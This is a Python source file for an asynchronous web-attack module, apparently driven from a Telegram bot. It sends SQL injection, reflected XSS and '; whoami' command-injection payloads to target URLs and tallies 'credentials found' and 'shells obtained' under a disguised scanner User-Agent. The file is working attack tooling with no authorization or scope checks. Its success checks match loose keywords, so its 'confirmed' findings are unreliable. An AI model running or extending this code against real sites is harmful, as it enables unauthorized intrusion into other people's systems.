import asyncio
import aiohttp
import time
from typing import Dict, List, Any, Optional

class SimpleAsyncAttack:
    """Simple async attack handler that won't freeze Telegram"""
    
    def __init__(self):
        self.session = None
    
    async def get_session(self):
        """Get aiohttp session"""
        if not self.session:
            self.session = aiohttp.ClientSession(
                timeout=aiohttp.ClientTimeout(total=5),
                headers={'User-Agent': 'Security-Scanner/2.0'}
            )
        return self.session
    
    async def quick_attack(self, target_url: str, vulnerabilities: List[Dict], 
                          progress_callback=None) -> Dict[str, Any]:
        """Run quick async attacks without blocking"""
        
        results = {
            'total_attacks': 0,
            'successful_exploits': 0,
            'failed_exploits': 0,
            'credentials_found': [],
            'shells_obtained': [],
            'extracted_data': []
        }
        
        if progress_callback:
            await progress_callback("🚀 Starting fast attack sequence...")
        
        # Focus on first 5 high-impact vulnerabilities for speed
        high_impact = [v for v in vulnerabilities if v.get('severity') in ['Critical', 'High']][:5]
        
        if not high_impact:
            if progress_callback:
                await progress_callback("⚠️ No high-impact vulnerabilities found")
            return results
        
        if progress_callback:
            await progress_callback(f"🎯 Testing {len(high_impact)} vulnerabilities...")
        
        session = await self.get_session()
        tasks = []
        
        # Create async tasks for each vulnerability
        for i, vuln in enumerate(high_impact):
            task = self.test_vulnerability(session, vuln, i+1, len(high_impact), progress_callback)
            tasks.append(task)
        
        # Run all tests concurrently
        test_results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # Process results
        for i, result in enumerate(test_results):
            if isinstance(result, Exception):
                results['failed_exploits'] += 1
                continue
                
            results['total_attacks'] += 1
            
            if result.get('success'):
                results['successful_exploits'] += 1
                
                if result.get('type') == 'sql_injection':
                    results['credentials_found'].append({
                        'type': 'SQL Injection',
                        'location': result.get('location'),
                        'data': result.get('data', [])
                    })
                elif result.get('type') == 'command_injection':
                    results['shells_obtained'].append({
                        'type': 'Command Shell',
                        'location': result.get('location')
                    })
                
                results['extracted_data'].extend(result.get('data', []))
            else:
                results['failed_exploits'] += 1
        
        if progress_callback:
            success_rate = int((results['successful_exploits'] / max(results['total_attacks'], 1)) * 100)
            await progress_callback(f"✅ Attack completed! {results['successful_exploits']}/{results['total_attacks']} successful ({success_rate}%)")
        
        return results
    
    async def test_vulnerability(self, session: aiohttp.ClientSession, vuln: Dict, 
                               current: int, total: int, progress_callback=None):
        """Test individual vulnerability asynchronously"""
        
        vuln_type = vuln.get('type', '').lower()
        location = vuln.get('location', '')
        
        if progress_callback:
            await progress_callback(f"[{current}/{total}] Testing {vuln_type[:20]}...")
        
        try:
            if 'sql injection' in vuln_type:
                return await self.test_sql_injection(session, vuln)
            elif 'xss' in vuln_type:
                return await self.test_xss(session, vuln)
            elif 'command injection' in vuln_type:
                return await self.test_command_injection(session, vuln)
            else:
                return {'success': False, 'location': location}
                
        except Exception as e:
            return {'success': False, 'location': location, 'error': str(e)}
    
    async def test_sql_injection(self, session: aiohttp.ClientSession, vuln: Dict):
        """Test SQL injection vulnerability"""
        location = vuln.get('location', '')
        
        if not location or '?' not in location:
            return {'success': False, 'location': location}
        
        # Quick SQL test
        test_url = location.replace('?', "?id=1' OR '1'='1-- ")
        
        try:
            async with session.get(test_url) as response:
                content = await response.text()
                
                # Check for SQL indicators
                indicators = ['mysql', 'error', 'warning', 'database', 'syntax', 'select']
                if any(indicator in content.lower() for indicator in indicators):
                    return {
                        'success': True,
                        'type': 'sql_injection',
                        'location': location,
                        'data': [f"SQL injection confirmed at {location}"]
                    }
                    
        except Exception:
            pass
        
        return {'success': False, 'location': location, 'type': 'sql_injection'}
    
    async def test_xss(self, session: aiohttp.ClientSession, vuln: Dict):
        """Test XSS vulnerability"""
        location = vuln.get('location', '')
        
        if not location:
            return {'success': False, 'location': location}
        
        # Quick XSS test
        payload = "<script>alert('XSS')</script>"
        test_url = f"{location}?q={payload}" if '?' not in location else f"{location}&test={payload}"
        
        try:
            async with session.get(test_url) as response:
                content = await response.text()
                
                if payload in content or 'alert(' in content:
                    return {
                        'success': True,
                        'type': 'xss',
                        'location': location,
                        'data': [f"XSS confirmed at {location}"]
                    }
                    
        except Exception:
            pass
        
        return {'success': False, 'location': location, 'type': 'xss'}
    
    async def test_command_injection(self, session: aiohttp.ClientSession, vuln: Dict):
        """Test command injection vulnerability"""
        location = vuln.get('location', '')
        
        if not location:
            return {'success': False, 'location': location}
        
        # Quick command test
        payload = "; whoami"
        test_url = f"{location}?cmd={payload}" if '?' not in location else f"{location}&cmd={payload}"
        
        try:
            async with session.get(test_url) as response:
                content = await response.text()
                
                # Check for command execution
                indicators = ['root', 'user', 'uid=', 'gid=', '/bin/', 'home']
                if any(indicator in content.lower() for indicator in indicators):
                    return {
                        'success': True,
                        'type': 'command_injection',
                        'location': location,
                        'data': [f"Command injection confirmed at {location}"]
                    }
                    
        except Exception:
            pass
        
        return {'success': False, 'location': location, 'type': 'command_injection'}
    
    async def close(self):
        """Close session"""
        if self.session:
            await self.session.close()
            self.session = None

# Global simple async attacker
simple_attacker = SimpleAsyncAttack()